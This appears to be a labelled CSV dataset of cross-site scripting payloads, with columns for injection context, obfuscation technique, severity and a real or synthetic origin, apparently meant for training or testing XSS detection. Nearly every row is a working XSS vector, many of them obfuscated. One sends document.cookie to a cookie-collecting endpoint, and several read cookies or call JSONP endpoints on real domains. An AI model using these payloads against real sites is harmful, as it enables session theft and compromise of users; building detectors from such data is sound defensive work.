payload,context,technique,severity,length,source
""" onerror=console.log(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,54,synthetic
<svg onerror=alert(%27XSS%27)/>,tag_injection,synthetic,medium,31,synthetic
<link contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,58,real
"<font draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</font>",event_handler,none,medium,64,real
"<tt onmousemove=""alert(1)"">AnonKryptiQuz</tt>",event_handler,none,medium,45,real
<svg onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,57,synthetic
&#x27;javascript:alert(2)&#x27;,js_uri,html_entity,medium,31,real
%27 onclick=confirm(%27XSS%27) %27,attribute_escape,synthetic,medium,34,synthetic
"<style>@keyframes x{}</style><img style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></img>",event_handler,none,medium,99,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ol id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ol>",event_handler,none,medium,174,real
"""><Svg onCliCk=ConFirM(dOcuMenT.dOmaIn)>",tag_injection,synthetic,medium,40,synthetic
%EF%BC%9Cscript%EF%BC%9E alert() %EF%BC%9C/script%EF%BC%9E,generic,url_encoding,medium,58,real
"<div draggable=""true"" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>",event_handler,none,medium,105,real
"<svg:svg><svg:mask id=""maskForClickjacking"" maskUnits=""objectBoundingBox"" maskContentUnits=""objectBoundingBox""><svg:rect x=""0.0"" y=""0.0"" width=""0.373"" height=""0.3"" fill=""white""/><svg:circle cx=""0.45"" cy=""0.7"" r=""0.075"" fill=""white""/></svg:mask></svg:svg></body>",event_handler,none,low,261,real
"<del onclick=""alert(1)"">AnonKryptiQuz</del>",event_handler,none,medium,43,real
"<source onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</source>",event_handler,none,medium,74,real
"<multicol draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</multicol>",event_handler,none,medium,94,real
"<style>@keyframes x{}</style><input2 style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></input2>",event_handler,none,medium,105,real
%3Cx/Onpointerrawupdate=confirm%26lpar;)%3Exxxxx,event_handler,url_encoding,low,48,real
%3Csvg ontoggle=alert('XSS')/%3E,tag_injection,synthetic,medium,32,synthetic
"<nav onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</nav>",event_handler,none,medium,81,real
<script>alert`document.domain`</script>,script_injection,synthetic,medium,39,synthetic
"<style>@keyframes x{}</style><noscript style=""animation-name:x"" onanimationend=""alert(1)""></noscript>",event_handler,none,medium,101,real
%22><svg ontoggle=prompt(%27XSS%27)>,tag_injection,synthetic,medium,36,synthetic
"<div draggable=""true"" contenteditable>drag me</div><th ondrop=alert(1) contenteditable>drop here</th>",event_handler,none,medium,101,real
<scr<script>ipt>alert('AnonKryptiQuz')</scr</script>ipt>,script_injection,none,medium,56,real
"' ontoggle=alert(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,medium,49,synthetic
%22><img onload=alert(document.domain)>,tag_injection,synthetic,medium,39,synthetic
"<style>:target {color: red;}</style><embed id=x style=""transition:color 10s"" ontransitioncancel=print()></embed>",event_handler,none,low,112,real
"<table onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</table>",event_handler,none,medium,71,real
"<style>:target {transform: rotate(180deg);}</style><bdi id=x style=""transition:transform 2s"" ontransitionrun=print()></bdi>",event_handler,none,low,123,real
"<output onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></output>",event_handler,none,medium,285,real
"<head draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</head>",event_handler,none,medium,81,real
"<script>alert(""XSS by \nxss"")</script><marquee><h1>XSS by xss</h1></marquee>",script_injection,none,medium,76,real
%22><svg onclick=alert(%27XSS%27)>,tag_injection,synthetic,medium,34,synthetic
""" onb&#101;gin=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,50,synthetic
"<script>new Image().src=""http://localhost/cookie.php?c=""+document.cookie;</script>",script_injection,none,high,82,real
<var onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</var><input value=clickme>,event_handler,none,medium,97,real
"<div draggable=""true"" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable style=display:block>drop here</embed>",event_handler,none,medium,131,real
<svG oNtoGglE=cOnfIrm(1)/>,tag_injection,synthetic,medium,26,synthetic
"<del oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</del>",event_handler,none,medium,58,real
"<svg onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</svg>",event_handler,none,medium,68,real
<IMG '''><SCRIPT>alert(1)</SCRIPT>'>,script_injection,case_variation,medium,36,real
"""><svg onmouseover=confirm(document.cookie)>",tag_injection,synthetic,medium,44,synthetic
"<style>:target {color: red;}</style><content id=x style=""transition:color 10s"" ontransitioncancel=print()></content>",event_handler,none,low,116,real
<svg onb&#101;gin=confirm(docum&#101;nt.cooki&#101;)>,tag_injection,synthetic,medium,53,synthetic
"<input oncut=alert(1) value=""AnonKryptiQuz"" autofocus>",event_handler,none,medium,54,real
"<a oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</a>",event_handler,none,medium,54,real
"<image onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</image>",event_handler,none,medium,86,real
"<map draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</map>",event_handler,none,medium,84,real
"<style>:target {transform: rotate(180deg);}</style><sup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></sup>",event_handler,none,medium,124,real
"<tfoot onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</tfoot>",event_handler,none,medium,72,real
"<a href=""jav&#97ascript:javascript:alert(1)"">test1</a>",js_uri,html_entity,medium,54,real
"<bdi onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</bdi>",event_handler,none,medium,67,real
"<element oncut=""alert(1)"" contenteditable>AnonKryptiQuz</element>",event_handler,none,medium,65,real
%22><svg onmouseenter=prompt(1)>,tag_injection,synthetic,medium,32,synthetic
"<svg onmouseenter=console.log(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,medium,62,synthetic
""" oNclIck=coNfiRm(DocUmeNt.DomAin) """,attribute_escape,synthetic,medium,36,synthetic
<aside onpointerup=alert(1) style=display:block>AnonKryptiQuz</aside>,event_handler,none,medium,69,real
&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;,js_uri,none,medium,86,real
<svg onfocus=prompt(1)>,tag_injection,synthetic,medium,23,synthetic
"<sub onmouseup=""alert(1)"">AnonKryptiQuz</sub>",event_handler,none,medium,45,real
<button popovertarget=x>Click me</button><animatetransform ontoggle=alert(1) popover id=x>AnonKryptiQuz</animatetransform>,event_handler,none,medium,122,real
"<nav onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</nav>",event_handler,none,medium,67,real
"<style ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</style>",event_handler,none,medium,91,real
"<dl oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,96,real
<listing onpointerenter=alert(1) style=display:block>AnonKryptiQuz</listing>,event_handler,none,medium,76,real
"<u onclick=""alert(1)"">AnonKryptiQuz</u>",event_handler,none,medium,39,real
"<tt onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</tt>",event_handler,none,medium,63,real
' onb&#101;gin=confirm(1) ',attribute_escape,synthetic,medium,27,synthetic
"<style>:target {color:red;}</style><td id=x style=""transition:color 1s"" ontransitionstart=alert(1)></td>",event_handler,none,medium,104,real
<th onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,64,real
<option onpointermove=alert(1) style=display:block>AnonKryptiQuz</option>,event_handler,none,medium,73,real
"<style>:target {color: red;}</style><frameset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></frameset>",event_handler,none,medium,119,real
<tbody onpointerenter=alert(1) style=display:block>AnonKryptiQuz</tbody>,event_handler,none,medium,72,real
"<abbr onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</abbr>",event_handler,none,medium,65,real
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",attribute_escape,none,medium,135,real
%3Cscript%3Econsole.log(document.cookie)%3C/script%3E,script_injection,synthetic,medium,53,synthetic
<colgroup onpointerup=alert(1) style=display:block>AnonKryptiQuz</colgroup>,event_handler,none,medium,75,real
"<style>:target {transform: rotate(180deg);}</style><style id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></style>",event_handler,none,medium,128,real
"<style>@keyframes x{}</style><dir style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></dir>",event_handler,none,medium,99,real
"<style>:target {color: red;}</style><plaintext id=x style=""transition:color 10s"" ontransitioncancel=print()></plaintext>",event_handler,none,low,120,real
"<tfoot oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</tfoot>",event_handler,none,medium,73,real
<legend contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,60,real
""" oNfoCus=prOmpT(1) aUtoFocUs=""",attribute_escape,synthetic,medium,31,synthetic
"<div draggable=""true"" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable style=display:block>drop here</embed>",event_handler,none,medium,127,real
<svg onmous&#101;&#101;nt&#101;r=confirm(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,64,synthetic
"""><sVg/OnLuFy=""X=y""oNloaD=;1^confirm(1)>/``^1//",event_handler,case_variation,medium,47,real
"' oNmoUseEntEr=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape,synthetic,medium,59,synthetic
"<b draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</b>",event_handler,none,medium,58,real
"<iframe style=""xg-p:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",event_handler,none,medium,90,real
"<plaintext oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,102,real
<bdi onfocusout=alert(1) tabindex=1 id=x></bdi><input autofocus>,event_handler,none,medium,64,real
""" onmouseover=\u0061lert(document.cookie) """,attribute_escape,synthetic,medium,43,synthetic
"<style>@keyframes x{}</style><head style=""animation-name:x"" onanimationstart=""alert(1)""></head>",event_handler,none,medium,95,real
<scRipT>/*/pRomPt(DocUmeNt.DomAin)</ScrIpt>,script_injection,synthetic,medium,43,synthetic
"<canvas onmouseleave=""alert(1)"">AnonKryptiQuz</canvas>",event_handler,none,medium,54,real
<kbd onpointerout=alert(1) style=display:block>AnonKryptiQuz</kbd>,event_handler,none,medium,66,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><map id=x style=""position:absolute;"" onanimationcancel=""print()""></map>",event_handler,none,low,175,real
"<style>@keyframes x{}</style><menu style=""animation-name:x"" onanimationstart=""alert(1)""></menu>",event_handler,none,medium,95,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><form id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></form>",event_handler,none,medium,178,real
""" onclick=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,68,synthetic
"""><img onlo&#97;d=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,56,synthetic
"' oNloAd=ConFirM(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape,synthetic,medium,49,synthetic
"<template draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</template>",event_handler,none,medium,74,real
' oNfoCus=coNsoLe.Log('XSS') ',attribute_escape,synthetic,medium,30,synthetic
""" oNbeGin=coNsoLe.Log(loCatIon.haSh) """,attribute_escape,synthetic,medium,38,synthetic
"<style>:target {transform: rotate(180deg);}</style><form id=x style=""transition:transform 2s"" ontransitionrun=print()></form>",event_handler,none,low,125,real
"""><svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,92,synthetic
<form contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,58,real
"<th draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</th>",event_handler,none,medium,62,real
"<style>:target {color:red;}</style><pre id=x style=""transition:color 1s"" ontransitionstart=alert(1)></pre>",event_handler,none,medium,106,real
"<style>:target {color:red;}</style><main id=x style=""transition:color 1s"" ontransitionend=alert(1)></main>",event_handler,none,medium,106,real
<script>alert(1)</script>.htm,script_injection,none,medium,29,real
j&#97;v&#97;script:void(confirm(docum&#101;nt.cooki&#101;)),js_uri,synthetic,medium,59,synthetic
<input type=checkbox id=x onfocus=alert(1)>,event_handler,none,medium,43,real
""" oNclIck=alErt(doCumEnt.doMaiN) """,attribute_escape,synthetic,medium,34,synthetic
""" ontoggl&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,60,synthetic
""" onclick=consol&#101;.log(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,51,synthetic
"<div draggable=""true"" contenteditable>drag me</div><header ondragover=alert(1) contenteditable style=display:block>drop here</header>",event_handler,none,medium,133,real
"<abbr onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</abbr>",event_handler,none,medium,61,real
"<slot onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</slot>",event_handler,none,medium,69,real
"<IMG SRC=""jav&#x09;ascript:alert(7333);"">",tag_injection,html_entity|whitespace_obfuscation|case_variation,medium,41,real
"""><Svg onLoaD=cOnfIrm(doCumEnt.coOkiE)>",tag_injection,synthetic,medium,39,synthetic
"<abbr onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</abbr>",event_handler,none,medium,67,real
<keygen onpointerover=alert(1) style=display:block>AnonKryptiQuz</keygen>,event_handler,none,medium,73,real
"""><script+src=""https://mempf.yahoo.co.jp/offer?position=h&callback=alert(1337)""></script>",script_injection,none,medium,89,real
"<style>@keyframes slidein {}</style><dfn style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dfn>",event_handler,none,medium,160,real
"""><img src=x onerror=prompt('document.domain');>.asp",event_handler,none,medium,52,real
"' ontoggl&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,65,synthetic
"<thead onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</thead>",event_handler,none,medium,71,real
"<bdo ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</bdo>",event_handler,none,medium,87,real
"<meter onmouseout=""alert(1)"">AnonKryptiQuz</meter>",event_handler,none,medium,50,real
"""><img onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,59,synthetic
"""`'><script>\x3Bjavascript:alert(1)</script>",script_injection,none,medium,44,real
<q id=x tabindex=1 onfocusin=alert(1)></q>,event_handler,none,medium,42,real
"""><svg onbegin=\u0061lert(document.domain)>",tag_injection,synthetic,medium,43,synthetic
"""""><img src=y onerror=confirm(1)>",event_handler,none,medium,33,real
"<td oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</td>",event_handler,none,medium,67,real
"<summary onmousedown=""alert(1)"">AnonKryptiQuz</summary>",event_handler,none,medium,55,real
"<section onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</section>",event_handler,none,medium,67,real
"document.write(""%3Cimg src=x onerror=alert(document.cookie)%3E"")",dom_sink,synthetic,medium,64,synthetic
"<menu onmousemove=""alert(1)"">AnonKryptiQuz</menu>",event_handler,none,medium,49,real
<caption onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,69,real
%27 onbegin=confirm(document.cookie) %27,attribute_escape,synthetic,medium,40,synthetic
"<svg onload=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,51,synthetic
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,generic,html_entity,low,99,real
""" onfocus=&#97;l&#101;rt(1) &#97;utofocus=""",attribute_escape,synthetic,medium,43,synthetic
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",event_handler,case_variation,high,60,real
"<head onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</head>",event_handler,none,medium,70,real
""" onmous&#101;ov&#101;r=consol&#101;.log(1) """,attribute_escape,synthetic,medium,45,synthetic
document.write(%22<img src=x onerror=alert(%27XSS%27)>%22),dom_sink,synthetic,medium,58,synthetic
<svg onfocus=consol&#101;.log(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,58,synthetic
"<rt ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</rt>",event_handler,none,medium,85,real
"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationend=""alert(1)""></canvas>",event_handler,none,medium,97,real
' oNerRor=coNfiRm(DocUmeNt.CooKie) ',attribute_escape,synthetic,medium,36,synthetic
"<bdo onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</bdo>",event_handler,none,medium,81,real
"<isindex onmouseenter=""alert(1)"">AnonKryptiQuz</isindex>",event_handler,none,medium,56,real
"<samp draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</samp>",event_handler,none,medium,81,real
"<datalist draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</datalist>",event_handler,none,medium,94,real
<svg onfocus=prompt(location.hash)/>,tag_injection,synthetic,medium,36,synthetic
<button popovertarget=x>Click me</button><rtc onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</rtc>,event_handler,none,medium,102,real
%3Csvg onbegin=alert(document.domain)%3E,tag_injection,synthetic,medium,40,synthetic
"<iframe srcdoc=""&lt;img src=1 onerror=alert(1)&gt;""></iframe>",event_handler,none,medium,61,real
"""%3E%3Csvg onmouseenter=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,69,synthetic
<code onpointerdown=alert(1) style=display:block>AnonKryptiQuz</code>,event_handler,none,medium,69,real
"perl -e 'print \""&lt;SCR\0IPT&gt;alert(\\""XSS\\"")&lt;/SCR\0IPT&gt;\"";' &gt; out",generic,none,medium,79,real
<header onpointerenter=alert(1) style=display:block>AnonKryptiQuz</header>,event_handler,none,medium,74,real
"<col onmouseenter=""alert(1)"">AnonKryptiQuz</col>",event_handler,none,medium,48,real
"<var onmousedown=""alert(1)"">AnonKryptiQuz</var>",event_handler,none,medium,47,real
<svg ontoggle=confirm(document.cookie)>,tag_injection,synthetic,medium,39,synthetic
""" oNmoUseEntEr=ConSolE.lOg(1) """,attribute_escape,synthetic,medium,31,synthetic
><s %2b cript>alert(document.cookie)</script>,dom_sink,url_encoding,high,45,real
<cite contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,58,real
<svg onfocus=console.log(document.domain)/>,tag_injection,synthetic,medium,43,synthetic
<img2 contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,58,real
"""%3E%3Csvg ontoggle=console.log(document.cookie)%3E",tag_injection,synthetic,medium,51,synthetic
"<image2 onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</image2>",event_handler,none,medium,88,real
<tt onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</tt>,event_handler,none,medium,70,real
<script>/*/confirm(1)</script>,script_injection,synthetic,medium,30,synthetic
“autofocus onFocUs=’find(l\u{6F}cati\u{6F}n=`j&Tab;avascr&NewLine;ipt&colon;al&Tab;ert()`)’,event_handler,none,low,91,real
"<data oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</data>",event_handler,none,medium,71,real
"quot;"">""onmousemove=alert('flag{THIS_IS_THE_FLAG}');""@evil.com</a>",event_handler,none,medium,66,real
"<style>@keyframes slidein {}</style><rb style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rb>",event_handler,none,medium,158,real
"<html onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</html>",event_handler,none,medium,69,real
"<table onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</table>",event_handler,none,medium,72,real
"<a onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</a>",event_handler,none,medium,61,real
<button popovertarget=x>Click me</button><input4 ontoggle=alert(1) popover id=x>AnonKryptiQuz</input4>,event_handler,none,medium,102,real
"<style>:target {color:red;}</style><td id=x style=""transition:color 1s"" ontransitionend=alert(1)></td>",event_handler,none,medium,102,real
"<tt onmouseenter=""alert(1)"">AnonKryptiQuz</tt>",event_handler,none,medium,46,real
"<progress onmouseenter=""alert(1)"">AnonKryptiQuz</progress>",event_handler,none,medium,58,real
"<multicol draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</multicol>",event_handler,none,medium,94,real
"<cite onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</cite>",event_handler,none,medium,61,real
"<header onmouseout=""alert(1)"">AnonKryptiQuz</header>",event_handler,none,medium,52,real
"<samp onclick=""alert(1)"">AnonKryptiQuz</samp>",event_handler,none,medium,45,real
%27 ontoggle=confirm(location.hash) %27,attribute_escape,synthetic,medium,39,synthetic
<hgroup onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</hgroup><input value=clickme>,event_handler,none,medium,112,real
<video2 onpointerout=alert(1) style=display:block>AnonKryptiQuz</video2>,event_handler,none,medium,72,real
' ontoggle=prompt(document.cookie) ',attribute_escape,synthetic,medium,36,synthetic
"<script\x0Atype=""text/javascript"">javascript:alert(3663);</script>",script_injection,none,medium,66,real
"""><script+src=""http://search.twitter.com/trends.json?callback=alert()""></script>",script_injection,none,medium,80,real
%22><svg onfocus=alert(%27XSS%27)>,tag_injection,synthetic,medium,34,synthetic
"<template onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</template>",event_handler,none,medium,89,real
"<image src=""javascript:alert(2)""> // IE6, O10.10↓, OM10.0↓",js_uri,none,medium,58,real
"<table BACKGROUND=""javascript:document.vulnerable=true;"">",js_uri,none,low,57,real
<svg onload=console.log(%27XSS%27)/>,tag_injection,synthetic,medium,36,synthetic
"<input4 id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></input4>",event_handler,none,medium,88,real
<svg>on%20onload%3D(“AnonKryptiQuz”)(document.domain)<%2Fsvg>,tag_injection,url_encoding,low,61,real
<label id=x tabindex=1 onactivate=alert(1)></label>,event_handler,none,medium,51,real
"<svg onmous&#101;ov&#101;r=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,83,synthetic
"<IMG SRC=x oninvalid=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,60,real
<svg onerror=alert('XSS')>,tag_injection,synthetic,medium,26,synthetic
"document.write(""%3Cimg src=x onerror=confirm(location.hash)%3E"")",dom_sink,synthetic,medium,64,synthetic
%27 onbegin=alert(location.hash) %27,attribute_escape,synthetic,medium,36,synthetic
<table onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</table><input value=clickme>,event_handler,none,medium,101,real
"<a href=""\x12javascript:javascript:alert(4586)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
"&lt;IMG SRC=\""jav&#x0D;ascript&#058;alert('XSS');\""&gt;",generic,html_entity|whitespace_obfuscation,medium,55,real
"<a href=""\xE1\x9A\x80javascript:javascript:alert(8293)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,82,real
<rt onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</rt><input value=clickme>,event_handler,none,medium,95,real
"<strong onclick=""alert(1)"" style=display:block>AnonKryptiQuz</strong>",event_handler,none,medium,69,real
<div style=xss:expression(1)-alert(1)>,generic,none,medium,38,real
"<style>:target {color: red;}</style><span id=x style=""transition:color 10s"" ontransitioncancel=print()></span>",event_handler,none,low,110,real
"<multicol onclick=""alert(1)"" style=display:block>AnonKryptiQuz</multicol>",event_handler,none,medium,73,real
"""'><img src=xxx:x \x2Fonerror=javascript:alert(1)>",event_handler,none,medium,50,real
"""%3E%3Cimg onload=prompt(1)%3E",tag_injection,synthetic,medium,30,synthetic
<hr onpointerleave=alert(1) style=display:block>AnonKryptiQuz</hr>,event_handler,none,medium,66,real
"<img src\x10=x onerror=""javascript:alert(1)"">",event_handler,none,medium,45,real
"<template draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</template>",event_handler,none,medium,94,real
"<keygen draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</keygen>",event_handler,none,medium,89,real
"<svG oNerRor=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,medium,56,synthetic
' onmouseenter=console.log(document.cookie) ',attribute_escape,synthetic,medium,45,synthetic
<center onpointerover=alert(1) style=display:block>AnonKryptiQuz</center>,event_handler,none,medium,73,real
"<slot onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</slot>",event_handler,none,medium,83,real
"""><img src=x onerror=prompt(document.cookie);>",event_handler,none,high,46,real
"<noframes onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</noframes>",event_handler,none,medium,71,real
%27 onfocus=prompt(document.cookie) %27,attribute_escape,synthetic,medium,39,synthetic
"<main onmouseleave=""alert(1)"">AnonKryptiQuz</main>",event_handler,none,medium,50,real
"<svg onmouseenter=prompt(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,medium,57,synthetic
"<html ondblclick=""alert(1)"">AnonKryptiQuz</html>",event_handler,none,medium,48,real
' oNloAd=AleRt(1) ',attribute_escape,synthetic,medium,19,synthetic
"<textarea draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</textarea>",event_handler,none,medium,93,real
"javascript://'/</title></style></textarea></script>--><p"" onclick=alert()//>*/alert()/*",event_handler,none,medium,87,real
"""><img src=x onmouseover=prompt(\u0064ocument.domain);>",event_handler,unicode_escape,medium,55,real
"<hgroup draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</hgroup>",event_handler,none,medium,70,real
<svg ontoggle=confirm(document.cookie)/>,tag_injection,synthetic,medium,40,synthetic
"<style>@keyframes x{}</style><animatemotion style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></animatemotion>",event_handler,none,medium,119,real
"<main onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</main>",event_handler,none,medium,61,real
"<svg onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</svg>",event_handler,none,medium,62,real
<plaintext contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,63,real
"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></kbd>",event_handler,none,medium,124,real
"<canvas onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</canvas>",event_handler,none,medium,71,real
alert('bar');,generic,none,medium,13,real
